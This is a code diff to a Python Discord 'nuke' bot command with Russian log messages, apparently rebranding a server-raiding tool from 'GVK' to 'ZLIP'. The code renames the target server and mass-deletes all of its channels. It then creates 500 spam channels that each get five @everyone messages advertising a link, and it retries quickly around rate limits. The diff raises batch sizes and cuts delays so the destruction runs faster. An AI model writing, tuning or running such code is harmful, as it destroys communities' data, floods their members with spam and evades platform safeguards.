@@ -25,30 +25,17 @@ async def nuke(ctx):
     guild = ctx.guild
     
     try:
-        await guild.edit(name="OWNED BY GVK")
+        await guild.edit(name="MOGGED BY ZLIP")
         print("✅ Название изменено")
     except:
         print("❌ Не удалось изменить название")
     
-    print("🗑️ Удаление каналов...")
+    print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
     
     deleted = 0
     skipped = 0
     channels = list(guild.channels)
     total = len(channels)
-    
-    async def delete_channels_batch(batch):
-        nonlocal deleted, skipped
-        tasks = []
-        for channel in batch:
-            tasks.append(delete_single_channel(channel))
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        for result in results:
-            if result is True:
-                deleted += 1
-            elif result is False:
-                skipped += 1
     
     async def delete_single_channel(channel):
         try:
@@ -57,63 +44,46 @@ async def nuke(ctx):
         except:
             return False
     
-    batch_size = 10
+    batch_size = 15
     for i in range(0, total, batch_size):
         batch = channels[i:i+batch_size]
-        await delete_channels_batch(batch)
-        
-        if (i // batch_size) % 3 == 0:
-            await asyncio.sleep(0.05)
-        else:
-            await asyncio.sleep(0.01)
-        
-        if (i + batch_size) % 50 == 0:
-            print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
-    
-    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
-    
-    await asyncio.sleep(1)
-    
-    print("🔥 СОЗДАНИЕ КАНАЛОВ...")
-    
-    SPAM_TEXT = """@everyone
-**ТРАХНУТЫ BY GVK**
-
-https://discord.gg/3B3yEVwGb5
-
-ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ GVK
-"""
-    
-    created = 0
-    failed = 0
-    target_channels = 400
-    
-    async def create_channel_batch(batch_num):
-        nonlocal created, failed
-        tasks = []
-        
-        for j in range(8):
-            i = batch_num * 8 + j
-            if i >= target_channels:
-                break
-            tasks.append(create_single_channel(i))
-        
-        if not tasks:
-            return
-        
+        tasks = [delete_single_channel(ch) for ch in batch]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         
         for result in results:
             if result is True:
-                created += 1
+                deleted += 1
             else:
-                failed += 1
+                skipped += 1
+        
+        await asyncio.sleep(0.02)
+        
+        if (i + batch_size) % 60 == 0:
+            print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
+    
+    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
+    
+    await asyncio.sleep(0.5)
+    
+    print("🔥 МОМЕНТАЛЬНОЕ СОЗДАНИЕ КАНАЛОВ...")
+    
+    SPAM_TEXT = """@everyone
+**MOGGED BY ZLIP**
+
+https://guns.lol/dszlip
+
+ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ZLIP
+"""
+    
+    created = 0
+    failed = 0
+    target_channels = 500
     
     async def create_single_channel(i):
         global channel_counter, rate_limit_hits
         
         try:
-            ch = await guild.create_text_channel(f"gvk-nuked-{i+1}")
+            ch = await guild.create_text_channel(f"zlip-nuked-{i+1}")
             
             messages = [ch.send(SPAM_TEXT) for _ in range(5)]
             await asyncio.gather(*messages)
@@ -133,8 +103,7 @@ https://discord.gg/3B3yEVwGb5
         except discord.HTTPException as e:
             if "rate" in str(e).lower():
                 rate_limit_hits += 1
-                wait_time = min(rate_limit_hits * 0.08, 0.4)
-                print(f"⚠️ Rate limit #{rate_limit_hits}, жду {wait_time:.1f}с")
+                wait_time = min(rate_limit_hits * 0.05, 0.3)
                 await asyncio.sleep(wait_time)
                 return await create_single_channel(i)
             else:
@@ -144,36 +113,29 @@ https://discord.gg/3B3yEVwGb5
             print(f"❌ Ошибка: {e}")
             return False
     
-    batch_size = 8
+    batch_size = 10
     max_batches = target_channels // batch_size + 1
-    last_speed_check = time.time()
-    speed_samples = []
     
     for batch_num in range(max_batches):
-        await create_channel_batch(batch_num)
+        tasks = []
+        for j in range(batch_size):
+            i = batch_num * batch_size + j
+            if i >= target_channels:
+                break
+            tasks.append(create_single_channel(i))
         
-        elapsed = time.time() - start_time
-        current_speed = channel_counter / elapsed if elapsed > 0 else 0
+        if not tasks:
+            break
         
-        if current_speed < 6:
-            pause = 0.03
-        elif current_speed < 7:
-            pause = 0.05
-        else:
-            pause = 0.08
+        results = await asyncio.gather(*tasks, return_exceptions=True)
         
-        if rate_limit_hits > 10:
-            pause += 0.03
+        for result in results:
+            if result is True:
+                created += 1
+            else:
+                failed += 1
         
-        await asyncio.sleep(pause)
-        
-        if time.time() - last_speed_check > 2:
-            speed_samples.append(current_speed)
-            if len(speed_samples) > 5:
-                speed_samples.pop(0)
-            avg_speed = sum(speed_samples) / len(speed_samples)
-            print(f"⚡ Средняя скорость: {avg_speed:.1f}/сек")
-            last_speed_check = time.time()
+        await asyncio.sleep(0.02)
         
         if created >= target_channels:
             print(f"✅ Достигнута цель: {created} каналов")
@@ -191,11 +153,10 @@ https://discord.gg/3B3yEVwGb5
     print(f"❌ Ошибок: {failed}")
     print(f"⏱️ Время: {time.time() - start_time:.1f} сек")
     print(f"📊 Скорость: {created / (time.time() - start_time):.1f} каналов/сек")
-    print(f"⚠️ Rate limit попаданий: {rate_limit_hits}")
     print("="*50)
     
     try:
-        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}\nСкорость: {created / (time.time() - start_time):.1f}/сек")
+        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}")
     except:
         pass
 
